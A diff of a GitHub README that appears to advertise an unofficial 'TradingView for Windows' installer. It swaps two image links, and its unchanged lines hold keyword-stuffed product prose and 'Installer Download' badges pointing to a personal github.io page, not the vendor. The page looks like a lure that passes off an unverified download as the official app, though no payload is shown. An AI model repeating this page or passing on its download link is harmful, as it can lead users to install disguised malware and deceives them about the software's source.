@@ -1,6 +1,6 @@
 # TradingView Financial Charting Environment and Market Workspace for Windows
 
-<img width="1080" height="1080" alt="image" src="https://github.com/user-attachments/assets/e7f4af80-f3b0-41f0-aaa3-faf429a26914" />
+<img width="1080" height="1080" alt="image" src="https://github.com/user-attachments/assets/f7f55be7-76ca-4249-a199-7538a7991a39" />
 
  [![Installer](https://img.shields.io/badge/Installer-Download-00AEEF?style=flat)](https://hamzaturnerknnn.github.io/github/Tradingview-Download-Windows)
 
@@ -20,7 +20,7 @@ Technical analysts utilize proprietary indicator architectures like luxalgo trad
 
 Institutional research groups depend on the dedicated tradingview app windows version to coordinate market screens across extensive multi-monitor arrays seamlessly. The application preserves complex visual workspace templates, custom template rules, and active drawing layouts across reboots. Running this optimized tradingview desktop app distribution ensures that memory allocations remain highly controlled during continuous, multi-day operations tracking high-frequency global developments.
 
-<img width="1200" height="600" alt="image" src="https://github.com/user-attachments/assets/debe95e9-2740-4b3f-8582-bdfee20201cd" />
+<img width="1200" height="600" alt="image" src="https://github.com/user-attachments/assets/a9e1c5c3-c57f-43bb-a982-c78f371d1b8c" />
 
  [![Installer](https://img.shields.io/badge/Installer-Download-00AEEF?style=flat)](https://hamzaturnerknnn.github.io/github/Tradingview-Download-Windows)
 
